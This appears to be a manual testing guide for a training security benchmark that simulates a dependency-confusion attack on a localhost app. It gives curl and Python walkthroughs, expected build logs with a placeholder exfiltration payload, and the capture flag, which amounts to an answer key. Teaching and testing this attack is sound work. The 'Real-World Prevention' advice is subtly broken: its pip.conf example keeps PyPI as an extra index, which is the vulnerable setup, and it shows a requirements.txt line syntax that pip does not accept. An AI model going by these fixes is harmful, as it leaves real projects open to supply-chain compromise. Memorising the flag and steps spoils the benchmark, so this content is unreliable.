# S7BEN-EASY-009: Manual Testing Guide

## Vulnerability: Dependency Confusion - Supply Chain Attack

### Overview
This benchmark demonstrates a Dependency Confusion vulnerability where an attacker publishes a malicious package to a public registry with a higher version than an internal package, causing the build system to install the malicious version.

**Key Feature:** This is a TRAINING tier benchmark. Hints are provided and the UI explains the vulnerability.

---

## Setup

### 1. Build and Start the Benchmark
```bash
cd benchmarks/S7BEN-EASY-009
make build
make up
```

### 2. Verify Service is Running
```bash
make test
# Should output: Health check passed
```

### 3. Access the Application
Open your browser to: http://localhost:5000

---

## Understanding Dependency Confusion

### Attack Flow

```
Time  Internal Registry          Public Registry           Build Process
----  ------------------------   -----------------------   ---------------------------
t0    company-utils==1.0.0       (attacker publishes)
t1                               company-utils==9.9.9       
t2                                                          pip install company-utils
t3                                                          → Finds 1.0.0 (internal)
t4                                                          → Finds 9.9.9 (public)
t5                                                          → Installs 9.9.9 (highest!)
t6                                                          → MALICIOUS CODE EXECUTES
```

### Why This Works

1. Package managers resolve dependencies from ALL configured registries
2. The highest version number is typically selected
3. No built-in protection for "internal-only" packages
4. pip, npm, cargo, etc. all exhibit this behavior

---

## Manual Testing Steps

### Step 1: Check Current Packages

```bash
curl http://localhost:5000/packages | jq .
```

**Expected Output:**
```json
{
  "status": "success",
  "installed_packages": {
    "company-utils": {
      "version": "1.0.0",
      "source": "internal",
      "safe": true
    },
    "company-auth": {
      "version": "2.1.0",
      "source": "internal",
      "safe": true
    },
    "requests": {
      "version": "2.31.0",
      "source": "public",
      "safe": true
    },
    "flask": {
      "version": "3.0.0",
      "source": "public",
      "safe": true
    }
  },
  "total": 4
}
```

Notice `company-utils==1.0.0` is from the internal registry.

### Step 2: Check Oracle for Expected Behavior

```bash
curl http://localhost:5000/api/oracle | jq .
```

**Expected Output:**
```json
{
  "expected_vulnerability": "dependency_confusion",
  "expected_exploit_path": "POST /build → installs company-utils==9.9.9 from public registry",
  "expected_flag_location": "/api/check-compromise",
  "current_state": "vulnerable",
  "vulnerable_package": "company-utils",
  "internal_version": "1.0.0",
  "malicious_public_version": "9.9.9",
  "exploitation_steps": [...]
}
```

### Step 3: Trigger a Build

```bash
curl -X POST http://localhost:5000/build | jq .
```

**Expected Output:**
```json
{
  "status": "success",
  "build_id": "build-1736326901",
  "logs": [
    "=== Build build-1736326901 Started ===",
    "",
    "[*] Resolving package: company-utils",
    "    [internal] Found company-utils==1.0.0",
    "    [public]   Found company-utils==9.9.9",
    "[!] Public registry has higher version!",
    "[*] Installing company-utils==9.9.9 from public",
    "",
    "[!!!] MALICIOUS PACKAGE EXECUTED: company-utils==9.9.9",
    "[!!!] Payload: exec(import_os_and_exfiltrate_secrets)",
    "...",
    "=== Build build-1736326901 Completed ==="
  ],
  "packages_updated": 4,
  "compromised": true
}
```

Notice the critical lines:
- `[!] Public registry has higher version!`
- `[!!!] MALICIOUS PACKAGE EXECUTED`

### Step 4: Verify Exploitation

```bash
curl http://localhost:5000/api/check-compromise | jq .
```

**Expected Output:**
```json
{
  "status": "compromised",
  "compromised": true,
  "malicious_package": "company-utils==9.9.9",
  "compromise_timestamp": "2026-01-08T12:00:00.000000",
  "flag": "S7BEN{dependency_confusion_a1b2c3d4e5f67890abcdef1234567890}",
  "message": "Dependency confusion attack successful! Malicious package was installed."
}
```

### Step 5: Verify with API

```bash
curl http://localhost:5000/api/verify | jq .
```

**Expected Output:**
```json
{
  "exploitation_successful": true,
  "proof": {
    "malicious_package": "company-utils==9.9.9",
    "source": "public_registry",
    "timestamp": "2026-01-08T12:00:00.000000",
    "installed_by_build": true
  },
  "flag": "S7BEN{dependency_confusion_...}"
}
```

---

## Exploitation Methods

### Method 1: cURL (Command Line)

```bash
# Complete exploitation in one script
#!/bin/bash

URL="http://localhost:5000"

echo "=== S7BEN-EASY-009 Dependency Confusion Exploit ==="
echo ""

# Step 1: Check initial state
echo "[*] Step 1: Checking installed packages..."
curl -s "$URL/packages" | jq '.installed_packages["company-utils"]'
echo ""

# Step 2: Trigger build
echo "[*] Step 2: Triggering build..."
curl -s -X POST "$URL/build" | jq '.logs[-5:]'
echo ""

# Step 3: Get flag
echo "[*] Step 3: Retrieving flag..."
FLAG=$(curl -s "$URL/api/check-compromise" | jq -r '.flag')
echo ""
echo "============================================"
echo "FLAG: $FLAG"
echo "============================================"
```

### Method 2: Python Script

```python
import requests
import json

URL = "http://localhost:5000"

def exploit():
    print("=" * 60)
    print("S7BEN-EASY-009: Dependency Confusion Exploit")
    print("=" * 60)
    
    # Step 1: Check current packages
    print("\n[*] Step 1: Checking installed packages...")
    packages = requests.get(f"{URL}/packages").json()
    company_utils = packages['installed_packages'].get('company-utils', {})
    print(f"    company-utils version: {company_utils.get('version')}")
    print(f"    source: {company_utils.get('source')}")
    
    # Step 2: Trigger build
    print("\n[*] Step 2: Triggering build...")
    build_response = requests.post(f"{URL}/build").json()
    
    for log_line in build_response['logs']:
        if '[!!!]' in log_line or '[!]' in log_line:
            print(f"    {log_line}")
    
    # Step 3: Check compromise
    print("\n[*] Step 3: Checking compromise status...")
    compromise = requests.get(f"{URL}/api/check-compromise").json()
    
    if compromise.get('compromised'):
        print("\n" + "=" * 60)
        print("SUCCESS! EXPLOITATION COMPLETE")
        print("=" * 60)
        print(f"\nFlag: {compromise.get('flag')}")
        print(f"Malicious Package: {compromise.get('malicious_package')}")
        print("=" * 60)
        return True
    else:
        print("\n[-] Exploitation failed")
        return False

if __name__ == "__main__":
    exploit()
```

### Method 3: Browser

1. Open http://localhost:5000
2. Read the training explanation about Dependency Confusion
3. Notice the installed packages show `company-utils==1.0.0` from internal
4. Click "🚀 Trigger Build"
5. Observe the build logs showing the malicious package installation
6. Click "🏴 Get Flag" in the Exploitation Status section

---

## Testing Negative Controls

### Enable Patched Mode

```bash
# Toggle to patched mode
curl -X POST http://localhost:5000/api/patch-status \
  -H "Content-Type: application/json" \
  -d '{"patched": true}' | jq .
```

**Expected Output:**
```json
{
  "patched": true,
  "mode": "patched",
  "description": "Version pinning enabled - internal packages only from internal registry"
}
```

### Test Build in Patched Mode

```bash
# Reset first
curl -X POST http://localhost:5000/reset

# Build in patched mode
curl -X POST http://localhost:5000/build | jq '.logs | .[-10:]'
```

**Expected Output:**
The build should now show:
```
[SECURITY] Company package detected - using internal registry only
[*] Installing company-utils==1.0.0 from internal (pinned)
```

No compromise should occur.

---

## Testing Oracle and Verification Endpoints

### Check Oracle

```bash
curl http://localhost:5000/api/oracle | jq .
```

Shows expected exploitation path and current state.

### Check Expected (T1 Only)

```bash
curl http://localhost:5000/api/expected | jq .
```

Shows step-by-step correct exploitation for training.

### Check Telemetry

```bash
curl http://localhost:5000/api/telemetry | jq .
```

**Expected Output:**
```json
{
  "request_count": 15,
  "time_elapsed_seconds": 45.23,
  "alerts_triggered": 0,
  "stealth_score": 100,
  "noise_ratio": 0.0,
  "tier": 1,
  "note": "Stealth metrics not enforced in Training tier"
}
```

---

## Troubleshooting

### Issue: Build doesn't install malicious package

**Cause:** Application might be in patched mode.

**Solution:**
```bash
# Check patch status
curl http://localhost:5000/api/patch-status

# Disable patch if enabled
curl -X POST http://localhost:5000/api/patch-status \
  -H "Content-Type: application/json" \
  -d '{"patched": false}'

# Reset and try again
curl -X POST http://localhost:5000/reset
curl -X POST http://localhost:5000/build
```

### Issue: Flag not appearing

**Cause:** Build may not have been triggered.

**Solution:**
```bash
# Check compromise status
curl http://localhost:5000/api/check-compromise

# If not compromised, trigger build
curl -X POST http://localhost:5000/build

# Check again
curl http://localhost:5000/api/check-compromise
```

---

## Real-World Prevention

### How to Fix Dependency Confusion

1. **Use `--index-url` restriction:**
   ```bash
   pip install --index-url https://internal.registry.com/simple company-utils
   ```

2. **Pin versions in requirements.txt:**
   ```
   company-utils==1.0.0 --index-url https://internal.registry.com/simple
   ```

3. **Use pip.conf for internal packages:**
   ```ini
   [global]
   index-url = https://internal.registry.com/simple
   extra-index-url = https://pypi.org/simple
   ```

4. **Namespace your packages:**
   ```
   @company/utils  # npm
   company.utils   # Python
   ```

5. **Claim your package names on public registries**

---

## Cleanup

```bash
make down
make clean
```

---

## Success Criteria

- ✅ Identified internal package `company-utils==1.0.0`
- ✅ Triggered build with `POST /build`
- ✅ Observed malicious package installation in logs
- ✅ Retrieved flag from `/api/check-compromise`
- ✅ Flag format: `S7BEN{dependency_confusion_<32_hex_chars>}`

---

## Additional Resources

- **CWE-427:** https://cwe.mitre.org/data/definitions/427.html
- **Dependency Confusion Article:** https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
- **OWASP Supply Chain:** https://owasp.org/www-project-software-component-verification-standard/
